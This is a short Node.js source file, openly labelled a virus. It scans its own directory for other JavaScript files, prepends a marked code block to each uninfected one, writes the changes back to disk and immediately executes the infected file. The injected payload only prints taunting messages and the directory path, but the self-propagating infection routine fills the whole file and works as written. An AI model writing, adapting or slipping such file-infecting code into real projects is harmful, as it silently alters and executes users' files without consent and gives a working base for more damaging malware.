/* Main virus file */
const fs = require('fs');
const path = require('path');
let files;

function init(){
  /// look for other js files __dirname
  /// 1. reading files in directory - filtering for javascript files
  files = fs
    .readdirSync(__dirname)
    .filter((file) => file.match(/[a-zA-Z0-9]+.js$/g))
    .filter((file) => file !== path.basename(__filename));

  /// 2. reading contents for js files
  for(let i =0 ; i < files.length;i++){
    const filePath = path.join(__dirname,files[i]);
    const fileBuff = fs.readFileSync(filePath)
    let fileContent = fileBuff.toString("utf-8");
    const virusContent = `
// #UNIQUEVIRUSSTRING
(function(){
  console.log('sneakily executed! >:-)');
  console.log(__dirname,' ... I know where you live :)')
})()

// #endVirus
`;
    if(!fileContent.match(/#UNIQUEVIRUSSTRING/g)){
      fileContent = virusContent + fileContent;
      fs.writeFileSync(filePath,Buffer.from(fileContent));
      remoteExecute(files[i]);
    }
  }
}

init();

function findMyself(){
  console.log(path.basename(__filename));
}
findMyself();

function remoteExecute(filename){
  /// executing the contents of the file
  const filePath = path.join(__dirname,filename);
  const func = require(filePath);

}
